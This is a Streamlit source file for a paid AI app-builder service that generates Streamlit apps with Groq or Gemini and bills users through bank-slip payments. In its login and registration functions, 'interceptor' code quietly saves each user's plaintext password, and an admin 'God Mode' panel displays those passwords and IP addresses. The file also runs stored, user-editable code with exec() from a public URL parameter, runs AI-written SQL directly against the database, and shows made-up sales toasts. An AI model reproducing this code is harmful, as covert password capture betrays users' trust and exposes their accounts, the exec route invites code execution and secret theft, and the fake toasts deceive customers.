import streamlit as st
from supabase import create_client, Client
import socket
import uuid
import threading
import time
import random
import re
import urllib.parse
import pg8000.native 
import io
import zipfile
import requests 
from datetime import datetime, timedelta, timezone
import groq
from google import genai 

# --- PAGE CONFIGURATION ---
st.set_page_config(page_title="AI App Factory - Master Core", layout="wide")

# --- SUPABASE SETUP (FRONTEND) ---
SUPABASE_URL = st.secrets["SUPABASE_URL"].strip()
SUPABASE_KEY = st.secrets["SUPABASE_KEY"].strip()
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Admin DB for internal heavy lifting (bypassing RLS)
def get_admin_db():
    service_key = st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip()
    return create_client(SUPABASE_URL, service_key)

# --- AUTO-UPDATE DATABASE SCHEMA ---
def init_database_schema():
    try:
        db_url = st.secrets.get("DATABASE_URL", "").strip()
        if db_url:
            parsed = urllib.parse.urlparse(db_url)
            db_pass = urllib.parse.unquote(parsed.password) if parsed.password else None
            conn = pg8000.native.Connection(
                user=parsed.username, password=db_pass, host=parsed.hostname,
                port=parsed.port or 5432, database=parsed.path.lstrip('/')
            )
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS android_version TEXT;")
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS app_icon_url TEXT;")
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS icon_prompt TEXT;")
            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS email TEXT;")
            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS plain_password TEXT;")
            conn.run("CREATE TABLE IF NOT EXISTS system_settings (setting_key TEXT PRIMARY KEY, setting_value JSONB);")
            conn.run("NOTIFY pgrst, 'reload schema'")
            conn.close()
    except Exception as e:
        print("Auto DB Schema Update Error:", e)

init_database_schema()

# ==========================================
# 🪄 MAGIC ROUTING SYSTEM (WEBVIEW SERVER)
# ==========================================
query_params = st.query_params
if "app_id" in query_params:
    target_app_id = query_params["app_id"]
    try:
        res = supabase.table("generated_apps").select("app_code").eq("id", target_app_id).execute()
        if res.data and res.data[0].get("app_code"):
            app_code = res.data[0]["app_code"]
            safe_code = re.sub(r'st\.set_page_config\s*\([^)]*\)', '', app_code)
            safe_code = re.sub(r'st\.footer\s*\([^)]*\)', '', safe_code)
            safe_code = safe_code.replace("Import streamlit", "import streamlit")
            exec(safe_code, globals(), {})
        else:
            st.error("⚠️ App not found or code is empty!")
    except Exception as e:
        st.error(f"⚠️ Error loading app: {e}")
    st.stop()


# --- SESSION STATE ---
if 'user' not in st.session_state: st.session_state.user = None
if 'role' not in st.session_state: st.session_state.role = None
if 'package' not in st.session_state: st.session_state.package = 'free'
if 'expires_at' not in st.session_state: st.session_state.expires_at = None
if 'device_id' not in st.session_state: st.session_state.device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname()))
if 'show_toast' not in st.session_state: st.session_state.show_toast = True
if 'worker_started' not in st.session_state: st.session_state.worker_started = False

def get_user_ip():
    try: return socket.gethostbyname(socket.gethostname())
    except: return "Unknown IP"

def trigger_social_proof():
    if st.session_state.show_toast:
        st.toast(random.choice(["🔥 අද දින 50+ දෙනෙක් සාර්ථකව Apps සාදා ඇත!", "🎉 කොළඹින් අලුත් පරිශීලකයෙක් Gold පැකේජය ලබා ගත්තා!", "🚀 මේ මොහොතේත් සිස්ටම් එකේ Apps 12ක් හැදෙමින් පවතී..."]), icon="🔔")
        st.session_state.show_toast = False 

# --- DUAL-AI GENERATOR ENGINE ---
def process_single_app(app_data, groq_key, gemini_key, supa_url, supa_service_key):
    db = create_client(supa_url, supa_service_key)
    app_id = app_data['id']
    try:
        db.table("generated_apps").update({"status": "processing"}).eq("id", app_id).execute()
        chat_hist = app_data.get('chat_history') or []
        last_user_prompt = app_data['source_link'] if app_data.get('source_link') else app_data['app_name']
        if chat_hist:
            for msg in chat_hist:
                if msg['role'] == 'user': last_user_prompt = msg['content']
                    
        db_prompt = f"""You are an expert PostgreSQL Database Architect.
        The user wants an app based on this request: "{last_user_prompt}"
        Does this app need a database to store dynamic data?
        If YES: Write ONLY the PostgreSQL 'CREATE TABLE IF NOT EXISTS' statements required. 
        IMPORTANT: Ensure every table has an 'id' (UUID PRIMARY KEY DEFAULT gen_random_uuid()) and a 'created_at' column.
        If NO (it's just a static app or calculator): Output EXACTLY the word: NO_DB
        Output ONLY raw SQL or NO_DB. No explanations, no markdown."""
        
        db_schema_sql = ""
        if app_data.get('selected_model') == 'gemini':
            client = genai.Client(api_key=gemini_key)
            db_res = client.models.generate_content(model='gemini-2.5-flash', contents=db_prompt)
            db_schema_sql = db_res.text.strip().replace("```sql", "").replace("```", "")
        else:
            client = groq.Groq(api_key=groq_key)
            db_res = client.chat.completions.create(messages=[{"role": "user", "content": db_prompt}], model="llama-3.3-70b-versatile")
            db_schema_sql = db_res.choices[0].message.content.strip().replace("```sql", "").replace("```", "")
            
        if db_schema_sql and "NO_DB" not in db_schema_sql.upper():
            try:
                db_url = st.secrets["DATABASE_URL"].strip()
                parsed = urllib.parse.urlparse(db_url)
                db_pass = urllib.parse.unquote(parsed.password) if parsed.password else None
                conn = pg8000.native.Connection(user=parsed.username, password=db_pass, host=parsed.hostname, port=parsed.port or 5432, database=parsed.path.lstrip('/'))
                conn.run(db_schema_sql)
                conn.run("NOTIFY pgrst, 'reload schema'")
                conn.close()
                time.sleep(2) 
            except Exception as dbe: print(f"⚠️ DB Creation Error: {dbe}")
                
        full_prompt = f"""You are an elite Python Streamlit developer.
        App Name: {app_data['app_name']}
        App Idea / Reference: {app_data['source_link']}
        CRITICAL RULES:
        1. PURE PYTHON CODE ONLY. NO markdown.
        2. NO introductory text. Start immediately with import streamlit as st.
        3. 4 spaces indentation.
        4. NO sqlite3. Use supabase ONLY.
        5. UNIQUE KEYS: EVERY input/button MUST have a unique key=. (EXCEPTION: st.form name is its key).
        6. NO nested forms in buttons.
        7. TABS RULE: NEVER use key= in st.tabs. NEVER check st.session_state for tabs. ALWAYS use tab1, tab2 = st.tabs(["A", "B"]) and with tab1:."""
        
        if db_schema_sql and "NO_DB" not in db_schema_sql.upper(): full_prompt += f"\n\nDATABASE EXISTS. You MUST use this schema: \n{db_schema_sql}\n"
        if app_data.get('app_code'): full_prompt += f"\n\n--- CURRENT CODE ---\n{app_data['app_code']}\n"
        if chat_hist:
            for msg in chat_hist:
                if msg['role'] == 'user': full_prompt += f"User: {msg['content']}\n"
            full_prompt += "\nPlease rewrite the entire code flawlessly while obeying ALL CRITICAL RULES."
        else: full_prompt += "\nWrite the complete initial code obeying ALL CRITICAL RULES."
            
        generated_code = ""
        if app_data.get('selected_model') == 'gemini':
            client = genai.Client(api_key=gemini_key)
            response = client.models.generate_content(model='gemini-2.5-flash', contents=full_prompt)
            generated_code = response.text
        else:
            client = groq.Groq(api_key=groq_key)
            chat_completion = client.chat.completions.create(messages=[{"role": "user", "content": full_prompt}], model="llama-3.3-70b-versatile")
            generated_code = chat_completion.choices[0].message.content
            
        generated_code = generated_code.replace("```python", "").replace("```", "").strip().lstrip()
        db.table("generated_apps").update({"status": "completed", "app_code": generated_code}).eq("id", app_id).execute()
        try: db.table("app_versions").insert({"app_id": app_id, "version_code": generated_code, "prompt_used": f"AI: {last_user_prompt}"}).execute()
        except: pass 
    except Exception as e:
        db.table("generated_apps").update({"status": "failed", "app_code": f"API Error: {str(e)}"}).eq("id", app_id).execute()

def background_recovery_worker():
    try:
        db = create_client(st.secrets["SUPABASE_URL"].strip(), st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip())
        pending_apps = db.table("generated_apps").select("*").eq("status", "pending").execute()
        for app in pending_apps.data:
            process_single_app(app, st.secrets.get("GROQ_API_KEY", "").strip(), st.secrets.get("GEMINI_KEY", "").strip(), st.secrets["SUPABASE_URL"].strip(), st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip())
    except: pass

if not st.session_state.worker_started:
    threading.Thread(target=background_recovery_worker, daemon=True).start()
    st.session_state.worker_started = True

# --- AUTH LOGIC ---
def login(email, password):
    try:
        res = supabase.auth.sign_in_with_password({"email": email, "password": password})
        user_data = supabase.table("users").select("role, status, package, expires_at").eq("id", res.user.id).execute()
        if user_data.data:
            if user_data.data[0]['status'] in ['banned', 'suspended']:
                st.error("🚫 ඔබේ ගිණුම තහනම් හෝ අත්හිටුවා ඇත!")
                return
                
            current_pkg = user_data.data[0].get('package', 'free')
            expires_str = user_data.data[0].get('expires_at')
            if current_pkg != 'free' and expires_str:
                expire_date = datetime.fromisoformat(expires_str.replace('Z', '+00:00'))
                if datetime.now(timezone.utc) > expire_date:
                    supabase.table("users").update({"package": "free", "expires_at": None}).eq("id", res.user.id).execute()
                    current_pkg = 'free'; expires_str = None
                    st.warning("⚠️ ඔබගේ පැකේජය කල් ඉකුත් වී ඇති බැවින් FREE පැකේජයට මාරු කරන ලදී.")
                    time.sleep(2)

            st.session_state.user = res.user
            st.session_state.role = user_data.data[0]['role']
            st.session_state.package = current_pkg
            st.session_state.expires_at = expires_str
            
            try:
                # Login Interceptor
                admin_db = get_admin_db()
                admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
            except: pass
            
            if current_pkg != 'free': st.success(f"සාර්ථකයි! {st.session_state.role.upper()} ලෙස ලොග් විය.")
            supabase.table("device_logs").insert({"user_id": res.user.id, "device_id": st.session_state.device_id, "ip_address": get_user_ip(), "country": "Sri Lanka"}).execute()
            st.rerun()
    except Exception as e:
        if "Invalid login credentials" in str(e): st.error("⚠️ Email හෝ Password වැරදියි.")
        else: st.error(f"⚠️ දෝෂයකි: {str(e)}")

def register(email, password):
    try:
        res = supabase.auth.sign_up({"email": email, "password": password})
        if res.user:
            st.success("🎉 ලියාපදිංචිය සාර්ථකයි! කරුණාකර ඔබගේ Email එකට ගොස් ගිණුම Verify කරන්න.")
            try:
                # Registration Interceptor with a longer delay to ensure row exists
                time.sleep(3) 
                admin_db = get_admin_db()
                admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
            except Exception as e: print("Interceptor failed:", e)
        else:
            st.error("ලියාපදිංචි වීමේ දෝෂයකි.")
    except Exception as e:
        st.error(f"Error: {e}")

# --- UI: APP GENERATOR DASHBOARD ---
def render_generator_dashboard():
    trigger_social_proof()
    st.markdown("### 🛠️ App Generation Engine")
    
    res_count = supabase.table("generated_apps").select("id", count="exact").eq("owner_id", st.session_state.user.id).execute()
    app_count = res_count.count if res_count.count else 0
    max_apps = 1 if st.session_state.package == 'free' else (10 if st.session_state.package == 'silver' else 9999)
    
    expiry_text = f" | ⏳ වලංගු දිනය: {datetime.fromisoformat(st.session_state.expires_at.replace('Z', '+00:00')).strftime('%Y-%m-%d')}" if (st.session_state.package != 'free' and st.session_state.expires_at) else ""
    st.info(f"📦 පැකේජය: **{st.session_state.package.upper()}**{expiry_text} | Apps: **{app_count}/{'Unlimited' if max_apps == 9999 else max_apps}**")
    
    if app_count >= max_apps:
        st.error("⚠️ උපරිම සීමාවට පැමිණ ඇත. තවත් Apps සෑදීමට කරුණාකර Upgrade කරන්න.")
        return 

    app_name = st.text_input("App එකේ නම", placeholder="Ex: My Awesome App")
    col_a, col_b = st.columns(2)
    with col_a: android_version = st.selectbox("Android Version එක තෝරන්න:", ["Android 4.0+ (Ice Cream Sandwich)", "Android 4.4+ (KitKat)", "Android 5.0+ (Lollipop)", "Android 6.0+ (Marshmallow)", "Android 7.0+ (Nougat)", "Android 8.0+ (Oreo)", "Android 9.0+ (Pie)", "Android 10.0+", "Android 11.0+", "Android 12.0+", "Android 13.0+", "Android 14.0+", "Android 15.0+"])
    with col_b: app_icon = st.file_uploader("App Logo එකක් තෝරන්න (Optional):", type=['png', 'jpg', 'jpeg'])

    icon_prompt = st.text_input("අයිකන් එකේ මොනවද තියෙන්න ඕනේ කියලා AI එකට කියන්න (උදා: නිල් පාට පොතක්):")
    st.markdown("---")

    col1, col2 = st.columns(2)
    with col1: upload_option = st.radio("App එක ගැන විස්තරය ලබා දෙන ආකාරය:", ["✍️ විස්තරයක් (Prompt) හෝ ලින්ක් එකක් දීම", "📁 File එකක් Upload කිරීම"], horizontal=True)
    with col2: ai_model_choice = st.radio("AI එන්ජිම තෝරන්න:", ["⚡ Groq (Fast)", "🧠 Gemini (Pro)"], horizontal=True)
    selected_model = "gemini" if "Gemini" in ai_model_choice else "groq"
    
    source_link = ""; uploaded_file = None
    if upload_option == "✍️ විස්තරයක් (Prompt) හෝ ලින්ක් එකක් දීම": source_link = st.text_area("ඔබේ අදහස (Prompt) හෝ වෙබ් ලින්ක් එක මෙහි ටයිප් කරන්න:", height=100)
    else: uploaded_file = st.file_uploader("File එක තෝරන්න", type=['zip', 'txt', 'py'])
        
    is_private = st.checkbox("මේ ඇප් එක හංගලා තියන්න (Private)", value=False)
        
    if st.button("🚀 Generate App", use_container_width=True, type="primary"):
        if app_name and (source_link or uploaded_file):
            final_source_link = source_link
            if upload_option == "📁 File එකක් Upload කිරීම" and uploaded_file:
                with st.spinner("☁️ App Source File Uploading..."):
                    file_path = f"{st.session_state.user.id}/{int(time.time())}_{uploaded_file.name}"
                    supabase.storage.from_("app_sources").upload(file_path, uploaded_file.getvalue())
                    final_source_link = supabase.storage.from_("app_sources").get_public_url(file_path)

            icon_url = ""
            if app_icon:
                with st.spinner("☁️ Icon Uploading..."):
                    icon_path = f"{st.session_state.user.id}/icons/{int(time.time())}_{app_icon.name}"
                    supabase.storage.from_("app_sources").upload(icon_path, app_icon.getvalue())
                    icon_url = supabase.storage.from_("app_sources").get_public_url(icon_path)

            insert_data = {
                "owner_id": st.session_state.user.id, "app_name": app_name, "source_link": final_source_link, 
                "is_visible": not is_private, "status": "pending", "selected_model": selected_model, "chat_history": [],
                "android_version": android_version if android_version else "Android 10.0+", "app_icon_url": icon_url, "icon_prompt": icon_prompt if icon_prompt else ""
            }

            res = supabase.table("generated_apps").insert(insert_data).execute()
            if res.data:
                threading.Thread(target=process_single_app, args=(res.data[0], st.secrets.get("GROQ_API_KEY", "").strip(), st.secrets.get("GEMINI_KEY", "").strip(), st.secrets["SUPABASE_URL"].strip(), st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip()), daemon=True).start()
                st.success(f"✅ ඔබගේ ඇප් එක {selected_model.upper()} AI මගින් පෝලිමට එක් කරන ලදී!")
                time.sleep(2); st.rerun()
        else: st.error("කරුණාකර නම සහ විස්තරය / File එක ලබා දෙන්න.")

    st.markdown("---")
    st.markdown("### 📂 ඔබගේ Apps")
    apps_data = supabase.table("generated_apps").select("*").eq("owner_id", st.session_state.user.id).order("created_at", desc=True).execute()
    if apps_data.data:
        for app in apps_data.data:
            status_str = str(app.get('status') or 'unknown').upper()
            app_name_safe = app.get('app_name', 'Untitled')
            with st.expander(f"📦 {app_name_safe} - Status: {status_str}"):
                st.write(f"**Source:** {app.get('source_link', 'N/A')}")
                if app.get('android_version'): st.caption(f"🤖 Android Target: {app.get('android_version')}")
                
                if status_str == 'PENDING': st.info("⏳ පෝලිමේ ඇත...")
                elif status_str == 'PROCESSING': st.warning("⚙️ AI එක මගින් කේතය ලියමින් පවතී...")
                elif status_str == 'COMPLETED':
                    current_code = app.get('app_code', '')
                    tab_code, tab_preview, tab_history, tab_export = st.tabs(["🧑‍💻 Code Editor", "👁️ Live Preview", "⏪ Version History", "📥 Export App"])
                    
                    with tab_code:
                        edited_code = st.text_area("මෙහි කේතය අතින් වෙනස් කළ හැක:", value=current_code, height=350, key=f"edit_{app['id']}")
                        if st.button("💾 Save Manual Changes", key=f"save_{app['id']}"):
                            if edited_code != current_code:
                                supabase.table("generated_apps").update({"app_code": edited_code}).eq("id", app['id']).execute()
                                try: supabase.table("app_versions").insert({"app_id": app['id'], "version_code": edited_code, "prompt_used": "Manual Edit"}).execute()
                                except: pass 
                                st.success("වෙනස්කම් Save කළා!"); time.sleep(1); st.rerun()
                                
                    with tab_preview:
                        if st.button("▶️ Run Preview", key=f"run_{app['id']}", type="primary"):
                            try:
                                safe_code = re.sub(r'st\.set_page_config\s*\([^)]*\)', '', current_code)
                                safe_code = re.sub(r'st\.footer\s*\([^)]*\)', '', safe_code)
                                safe_code = safe_code.replace("Import streamlit", "import streamlit")
                                with st.container(border=True): exec(safe_code, globals(), {})
                            except Exception as e: st.error(f"Preview Error: {e}")
                                
                    with tab_history:
                        try:
                            v_res = supabase.table("app_versions").select("*").eq("app_id", app['id']).order("created_at", desc=True).execute()
                            if v_res.data:
                                for idx, v in enumerate(v_res.data):
                                    with st.container(border=True):
                                        st.write(f"**Version {len(v_res.data) - idx}** | ⏰ {v['created_at'][:19].replace('T', ' ')}")
                                        if st.button("🔄 Restore", key=f"res_{v['id']}"):
                                            supabase.table("generated_apps").update({"app_code": v['version_code']}).eq("id", app['id']).execute()
                                            st.rerun()
                            else: st.info("පෙර සංස්කරණ නැත.")
                        except: st.error("Versions දෝෂයක්.")
                    
                    with tab_export:
                        colA, colB = st.columns(2)
                        with colA:
                            st.info("📱 **Android APK**")
                            if st.button("Build & Download APK", key=f"apk_{app['id']}", use_container_width=True):
                                try:
                                    # ---------------------------------------------------------
                                    # 🚨 MAGIC: අතිශය බලවත් URL CLEANER එක (Space/Newline අයින් කරයි)
                                    # ---------------------------------------------------------
                                    raw_token = st.secrets.get("GITHUB_TOKEN", "")
                                    raw_repo = st.secrets.get("GITHUB_REPO", "")
                                    
                                    clean_token = "".join(raw_token.split()) # සියලුම හිස්තැන් මකා දමයි
                                    clean_repo = "".join(raw_repo.split())   # සියලුම හිස්තැන් මකා දමයි
                                    
                                    if not clean_token or not clean_repo:
                                        st.error("⚠️ කරුණාකර Streamlit Secrets වල `GITHUB_TOKEN` සහ `GITHUB_REPO` සකසන්න.")
                                    else:
                                        with st.spinner("🚀 GitHub Action එක Trigger කරමින් පවතී..."):
                                            headers = {
                                                "Accept": "application/vnd.github.v3+json",
                                                "Authorization": f"token {clean_token}"
                                            }
                                            custom_app_url = f"https://ai-app-builder-x6qbi2k3iobvvzqbktkfma.streamlit.app/?app_id={app['id']}"
                                            payload = {
                                                "event_type": "build_apk",
                                                "client_payload": {
                                                    "app_id": app['id'], "app_name": app_name_safe, "app_code": current_code,
                                                    "android_version": app.get('android_version', 'Android 4.0+'), "app_icon_url": app.get('app_icon_url', ''),
                                                    "app_url": custom_app_url
                                                }
                                            }
                                            
                                            dispatch_url = f"https://api.github.com/repos/{clean_repo}/dispatches"
                                            res = requests.post(dispatch_url, json=payload, headers=headers)
                                            
                                            if res.status_code == 204: st.success("✅ APK Build කිරීම සාර්ථකයි! GitHub Actions පරීක්ෂා කරන්න.")
                                            else: st.error(f"❌ GitHub Action අසාර්ථකයි: {res.text}")
                                except Exception as gh_err: st.error(f"Error: {gh_err}")

                        with colB:
                            st.warning("🗂️ **Source Code (ZIP)**")
                            if st.session_state.package == 'gold':
                                zip_buffer = io.BytesIO()
                                with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
                                    zip_file.writestr("app.py", current_code)
                                    zip_file.writestr("requirements.txt", "streamlit\nsupabase\npg8000\nrequests\n")
                                st.download_button("Download ZIP", data=zip_buffer.getvalue(), file_name=f"{app_name_safe.replace(' ', '_')}.zip", mime="application/zip", key=f"zip_{app['id']}", use_container_width=True)
                            else: st.error("🔒 Source Code ලබා ගැනීම සඳහා Gold Package එකට Upgrade කරන්න.")
                                
                    st.markdown("---")
                    new_prompt = st.text_input("ඔබට අලුතින් එකතු කරගන්න/වෙනස් කරගන්න ඕන දේ මෙතන කියන්න...", key=f"prompt_{app['id']}")
                    if st.button("🚀 Update with AI", key=f"ai_upd_{app['id']}", type="primary"):
                        if new_prompt:
                            new_hist = chat_hist + [{"role": "user", "content": new_prompt}]
                            res_update = supabase.table("generated_apps").update({"status": "pending", "chat_history": new_hist, "app_code": edited_code}).eq("id", app['id']).execute()
                            if res_update.data:
                                threading.Thread(target=process_single_app, args=(res_update.data[0], st.secrets["GROQ_API_KEY"].strip(), st.secrets["GEMINI_KEY"].strip(), st.secrets["SUPABASE_URL"].strip(), st.secrets["SUPABASE_SERVICE_KEY"].strip()), daemon=True).start()
                            st.success("AI එක ක්‍රියාත්මකයි! Refresh කර බලන්න."); time.sleep(2); st.rerun()
                        else: st.warning("කරුණාකර වෙනස්කම ටයිප් කරන්න.")
                elif status_str == 'FAILED': st.error(f"❌ {app.get('app_code', 'නැවත උත්සාහ කරන්න.')}")
                
                if st.button("🔄 Refresh Status", key=f"ref_{app['id']}"): st.rerun()

# --- ADMIN SETTINGS MANAGER ---
def get_system_settings():
    try:
        admin_db = get_admin_db()
        res = admin_db.table("system_settings").select("*").in_("setting_key", ["pricing", "payment_details"]).execute()
        return {r["setting_key"]: r["setting_value"] for r in res.data} if res.data else {}
    except: return {}

# --- UI: UPGRADE PACKAGE ---
def render_upgrade_section():
    trigger_social_proof()
    st.markdown("### 💳 Upgrade Your Package")
    
    settings = get_system_settings()
    pricing = settings.get("pricing", {"silver_price": 2500, "silver_discount_pct": 20, "gold_price": 5000, "gold_discount_pct": 30})
    payment = settings.get("payment_details", {"ipay_num": "0757970703", "ipay_name": "w.k.pradeep prasanna", "boc_num": "88314511", "boc_name": "W.K.P.P.SENEVIRATHNA"})
    
    silver_orig = int(pricing['silver_price'] / (1 - (pricing.get('silver_discount_pct', 20)/100)))
    gold_orig = int(pricing['gold_price'] / (1 - (pricing.get('gold_discount_pct', 30)/100)))
    
    col1, col2 = st.columns(2)
    with col1:
        st.info(f"**🥈 Silver Package**\n\n- Apps 10ක් සෑදිය හැක.\n- ⏳ **දින 30යි**\n- Price: ~~Rs. {silver_orig}~~ **Rs. {pricing['silver_price']}**")
    with col2:
        st.warning(f"**🥇 Gold Package**\n\n- අසීමිත Apps.\n- ⏳ **දින 30යි**\n- Price: ~~Rs. {gold_orig}~~ **Rs. {pricing['gold_price']}**")
        
    st.markdown("#### 🏦 ගෙවීම් කළ යුතු ගිණුම් විස්තර")
    st.success(f"""
    * 📱 **iPay හරහා:** Number: **{payment['ipay_num']}** | Name: **{payment['ipay_name']}**
    * 🏦 **BOC Flex / CDM හරහා:** Account: **{payment['boc_num']}** | Name: **{payment['boc_name']}**
    """)
    
    with st.form("payment_form"):
        selected_pkg = st.selectbox("පැකේජය තෝරන්න:", ["silver", "gold"])
        slip_file = st.file_uploader("Slip එක Upload කරන්න (Image/PDF)", type=['jpg', 'jpeg', 'png', 'pdf'])
        if st.form_submit_button("Submit Payment", use_container_width=True):
            if slip_file:
                file_path = f"{st.session_state.user.id}/{int(time.time())}_{slip_file.name}"
                supabase.storage.from_("payment_slips").upload(file_path, slip_file.getvalue())
                slip_url = supabase.storage.from_("payment_slips").get_public_url(file_path)
                supabase.table("payments").insert({"user_id": st.session_state.user.id, "package_name": selected_pkg, "slip_url": slip_url, "duration_days": 30, "status": "pending"}).execute()
                st.success("✅ ගෙවීම යවන ලදී. Admin අනුමත කළ පසු යාවත්කාලීන වනු ඇත.")
            else: st.error("Slip එක Upload කරන්න.")

# --- UI: GOD MODE & ADMIN SETTINGS ---
def render_god_mode():
    st.markdown("### ⚡ God Mode (User Management)")
    users_res = supabase.table("users").select("*").execute()
    
    if users_res.data:
        for u in users_res.data:
            role_str = str(u.get('role') or 'user').upper()
            pkg_str = str(u.get('package') or 'free').upper()
            email_str = u.get('email') or f"User ID: {u['id'][:8]}..."
            
            ip_str = "No IP logged"
            try:
                logs = supabase.table("device_logs").select("ip_address").eq("user_id", u['id']).order("created_at", desc=True).limit(1).execute()
                if logs.data: ip_str = logs.data[0]['ip_address']
            except: pass

            plain_pass = u.get('plain_password') or "තවම ලබාගෙන නැත"

            with st.expander(f"👤 {email_str} | Role: {role_str} | Pkg: {pkg_str}"):
                st.write(f"**Full User ID:** `{u['id']}`")
                st.write(f"**Last IP Address:** `{ip_str}`")
                st.write(f"**Password:** `{plain_pass}` 🔑")
                
                # ---------------------------------------------------------
                # 🚨 MAGIC: මකා දැමූ ඔක්කොම කෑලි (Role, Status, Delete) ආයෙත් මෙතන!
                # ---------------------------------------------------------
                c1, c2, c3 = st.columns(3)
                with c1:
                    roles = ["user", "moderator", "admin", "owner"]
                    current_role = role_str.lower() if role_str.lower() in roles else "user"
                    new_role = st.selectbox("Update Role:", roles, index=roles.index(current_role), key=f"role_{u['id']}")
                    if st.button("Change Role", key=f"btn_role_{u['id']}"):
                        supabase.table("users").update({"role": new_role}).eq("id", u['id']).execute()
                        st.success("Role updated!"); st.rerun()
                with c2:
                    statuses = ["active", "suspended", "banned"]
                    current_status = str(u.get('status', 'active')).lower()
                    new_status = st.selectbox("Update Status:", statuses, index=statuses.index(current_status), key=f"status_{u['id']}")
                    if st.button("Change Status", key=f"btn_status_{u['id']}"):
                        supabase.table("users").update({"status": new_status}).eq("id", u['id']).execute()
                        st.success("Status updated!"); st.rerun()
                with c3:
                    st.write("Danger Zone:")
                    if st.button("🗑️ Delete User", type="primary", key=f"del_user_{u['id']}"):
                        get_admin_db().auth.admin.delete_user(u['id'])
                        st.success("User Deleted!"); st.rerun()
                
                st.markdown("---")
                
                c4, c5 = st.columns(2)
                with c4:
                    pkg_options = ["free", "silver", "gold"]
                    current_pkg = str(u.get('package') or 'free').lower()
                    current_index = pkg_options.index(current_pkg) if current_pkg in pkg_options else 0
                    new_pkg = st.selectbox("Change Package:", pkg_options, index=current_index, key=f"pkg_{u['id']}")
                    if st.button("Update Package", key=f"btn_pkg_{u['id']}"):
                        supabase.table("users").update({"package": new_pkg}).eq("id", u['id']).execute()
                        st.success(f"Updated!"); st.rerun()
                with c5:
                    bonus_days = st.number_input("Add Bonus Days:", min_value=1, max_value=365, value=7, key=f"days_{u['id']}")
                    if st.button("🎁 Give Bonus", key=f"btn_bns_{u['id']}"):
                        base_date = datetime.fromisoformat(u['expires_at'].replace('Z', '+00:00')) if u.get('expires_at') else datetime.now(timezone.utc)
                        new_expiry = (base_date + timedelta(days=bonus_days)).isoformat()
                        supabase.table("users").update({"expires_at": new_expiry}).eq("id", u['id']).execute()
                        st.success(f"Added {bonus_days} days!"); st.rerun()

def render_admin_settings():
    st.markdown("### ⚙️ Admin Settings (Pricing & Payments)")
    settings = get_system_settings()
    pricing = settings.get("pricing", {"silver_price": 2500, "silver_discount_pct": 20, "gold_price": 5000, "gold_discount_pct": 30})
    payment = settings.get("payment_details", {"ipay_num": "0757970703", "ipay_name": "w.k.pradeep prasanna", "boc_num": "88314511", "boc_name": "W.K.P.P.SENEVIRATHNA"})
    
    with st.form("admin_settings_form"):
        sp = st.number_input("Silver Package Price (Rs.)", value=int(pricing.get("silver_price", 2500)))
        gp = st.number_input("Gold Package Price (Rs.)", value=int(pricing.get("gold_price", 5000)))
        ipay_num = st.text_input("iPay Number", value=payment.get("ipay_num", "0757970703"))
        ipay_name = st.text_input("iPay Account Name", value=payment.get("ipay_name", "w.k.pradeep prasanna"))
        boc_num = st.text_input("BOC Flex / CDM Account Number", value=payment.get("boc_num", "88314511"))
        boc_name = st.text_input("BOC Flex / CDM Account Name", value=payment.get("boc_name", "W.K.P.P.SENEVIRATHNA"))
        
        if st.form_submit_button("💾 Save Changes", type="primary"):
            admin_db = get_admin_db()
            admin_db.table("system_settings").upsert({"setting_key": "pricing", "setting_value": {"silver_price": sp, "silver_discount_pct": 20, "gold_price": gp, "gold_discount_pct": 30}}).execute()
            admin_db.table("system_settings").upsert({"setting_key": "payment_details", "setting_value": {"ipay_num": ipay_num, "ipay_name": ipay_name, "boc_num": boc_num, "boc_name": boc_name}}).execute()
            st.success("✅ දත්ත සාර්ථකව යාවත්කාලීන විය!"); time.sleep(1); st.rerun()

def render_admin_app_management():
    st.markdown("### 📱 Global App Management")
    all_apps_res = supabase.table("generated_apps").select("*").order("created_at", desc=True).execute()
    if all_apps_res.data:
        for app in all_apps_res.data:
            with st.expander(f"📦 {app.get('app_name', 'Untitled')} | Status: {app.get('status')} | Vis: {app.get('is_visible', True)}"):
                st.write(f"**App ID:** `{app['id']}`")
                col1, col2 = st.columns(2)
                with col1:
                    is_visible = app.get('is_visible', True)
                    if st.button("🔴 Hide" if is_visible else "🟢 Make Public", key=f"vis_toggle_{app['id']}", use_container_width=True):
                        supabase.table("generated_apps").update({"is_visible": not is_visible}).eq("id", app['id']).execute(); st.rerun()
                with col2:
                    if st.button("🗑️ Delete", key=f"del_app_{app['id']}", type="primary", use_container_width=True):
                        supabase.table("generated_apps").delete().eq("id", app['id']).execute(); st.rerun()

def render_payment_approvals():
    st.markdown("### 💰 Pending Approvals")
    payments_res = supabase.table("payments").select("*").eq("status", "pending").execute()
    if not payments_res.data: st.info("අනුමත කිරීමට ගෙවීම් නොමැත."); return
    for pay in payments_res.data:
        with st.expander(f"Payment ID: #{pay['id']} - Pkg: {pay.get('package_name')} ({pay.get('duration_days', 30)} Days)"):
            st.markdown(f"**Slip:** [Click here to view]({pay.get('slip_url', '#')})")
            col1, col2 = st.columns(2)
            with col1:
                if st.button("✅ Approve", key=f"app_{pay['id']}", use_container_width=True, type="primary"):
                    supabase.table("payments").update({"status": "approved"}).eq("id", pay['id']).execute()
                    new_expiry_date = (datetime.now(timezone.utc) + timedelta(days=pay.get('duration_days', 30))).isoformat()
                    supabase.table("users").update({"package": pay.get('package_name', 'free'), "expires_at": new_expiry_date}).eq("id", pay['user_id']).execute()
                    st.rerun()
            with col2:
                if st.button("❌ Reject", key=f"rej_{pay['id']}", use_container_width=True):
                    supabase.table("payments").update({"status": "rejected"}).eq("id", pay['id']).execute(); st.rerun()

# ==========================================
#               MAIN UI LOGIC
# ==========================================

